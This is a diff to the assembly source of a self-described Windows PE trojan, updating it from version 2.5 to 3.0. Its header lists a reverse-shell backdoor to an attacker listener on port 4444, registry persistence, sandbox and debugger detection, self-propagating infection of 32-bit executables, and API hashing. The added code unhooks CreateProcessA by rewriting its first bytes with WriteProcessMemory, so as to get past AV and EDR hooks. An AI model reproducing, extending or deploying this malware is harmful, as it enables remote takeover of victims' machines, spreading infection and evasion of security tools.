@@ -1,14 +1,18 @@
-;--------------------------------------------------------------------------------------------------------------------;
+;-------------------------------------------------------------------------------------------------------------------------------------;
 ; Author: Bach Ngoc Hung (hung.bachngoc@gmail.com)
 ; Compatible: Windows PE file 32 bits
-; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first (Line 201)
-; Version: 2.5
-; This trojan capable of creating backdoor using reverse shell, injecting it self to other PE file.
-; It can also add itself to the registry key and alters its behaviour when it detects sandboxes and debuggers
-; The injected file can also infect other files in the directory while avoiding inject to the infected files.
+; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first
+; Version: 3.0
+; This trojan is capable of:
+;	[+] Create backdoor and start reverse shell for remote execution
+;	[+] Add itself to the registry for persistence
+; 	[+] Detect sandbox and debugger and alter its behaviour
+;	[+] Infect all 32 bit exe files in the directory, infected files can do the same while continuing to function normally
+;	[+] Unhooking API to bypass AVs/EDRs
+;	[+] Hide API through hashing
 ; This program uses API hashing to get function addresses, referenced from Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com).
-; Size: 1223 bytes
-;--------------------------------------------------------------------------------------------------------------------;
+; Size: 1295 bytes
+;-------------------------------------------------------------------------------------------------------------------------------------;
 
 .386
 Option CaseMap:None
@@ -117,7 +121,15 @@ loop_funcname:
 	Pop Ecx
 	Pop Edx
 	Push Ecx
-	Jmp Eax						; Jump to the desired function
+	Mov Edx, [Ebp - 20H]				; Check the unhook required flag
+	Cmp Dl, 1					; If the flag is true
+	Je hooked_func_addr				; Then jump to this to get the address of the desired function only
+	Jmp Eax						; If not then execute function
+
+hooked_func_addr:
+	Xor Edx, Edx
+	Mov [Ebp - 20H], Edx				; Clear the flag
+	Ret						; Return to the original execution flow
 
 ; If the current module is not the desired one then jump here
 jump_next_module:
@@ -161,6 +173,34 @@ check:
 	Call hash_api
 	Test Al, Al					; Check if the flag is true or not
 	Jnz exit_success
+
+unhook_api:
+	; For demo, only CreateProcessA will get unhooked only
+	; Get handle of the current process
+	Push 51E2F352H					; hash("kernel32.dll", "GetCurrentProcess")
+	Call hash_api
+	Xchg Eax, Edi
+
+	Mov Al, 1
+	Mov [Ebp - 20H], Al				; Set flag for the function that needs to be unhooked
+	Push 863FCC79H					; hash("kernel32.dll", "CreateProcessA")
+	Call hash_api
+
+	Mov Dx, 5DECH
+	Push Edx
+	Push 8B55FF8BH					; "\x8B\xFF\x55\x8B\xEC\x5D" first 6 bytes of CreateProcessA
+	Mov Esi, Esp					; Pointer to the bytes string
+
+	; Unhook CreateProcessA
+	Xor Ecx, Ecx
+	Push Ecx					; lpNumberOfBytesWritten = NULL
+	Mov Cl, 6H
+	Push Ecx					; nSize
+	Push Esi					; lpBuffer
+	Push Eax					; CreateProcessA base address
+	Push Edi					; hProcess = GetCurrentProcess() handle
+	Push 0E7BDD8C5H					; hash("kernel32.dll", "WriteProcessMemory")
+	Call hash_api
 
 reverse_shell:
 	Mov [Ebp - 108H], Ebx				; This holds the address of the beginning of the payload
@@ -423,7 +463,6 @@ found_backslash:
 
 InjectingFile:
 	Xor Ecx, Ecx
-	Xor Eax, Eax
 	Lea Eax, [Ebp - 200H]
 	Push Ecx					; hTemplatefile (NULL)
 	Push Ecx					; dwFlagsAndAttributes (NULL)
